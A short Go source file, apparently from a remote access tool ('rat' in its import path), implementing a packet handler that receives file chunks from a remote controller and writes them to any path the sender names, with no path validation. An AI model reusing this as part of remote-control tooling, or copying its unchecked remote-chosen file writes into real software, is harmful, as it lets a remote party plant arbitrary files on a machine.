package main

import (
	"os"
	"rat/shared/network/header"

	"gopkg.in/mgo.v2/bson"
)

type DownloadPacket struct {
	File  string `network:"receive"`
	Final bool   `network:"receive"`
	Data  []byte `network:"receive"`
}

type TransfersMap map[string]*os.File

var Transfers TransfersMap

func init() {
	Transfers = make(TransfersMap)
}

func (packet DownloadPacket) Header() header.PacketHeader {
	return header.UploadToClientHeader
}

func (packet *DownloadPacket) Init() {

}

func (packet DownloadPacket) OnReceive() error {
	file := packet.File

	var err error

	if _, ok := Transfers[file]; !ok {
		Transfers[file], err = os.Create(file)
		if err != nil {
			return err
		}
	}

	w := Transfers[file]
	_, err = w.Write(packet.Data)

	if err != nil {
		return err
	}

	if packet.Final {
		err = w.Sync()
		if err != nil {
			return err
		}
		err = w.Close()
		if err != nil {
			return err
		}

		delete(Transfers, file)

		return nil
	}

	return err
}

func (packet DownloadPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
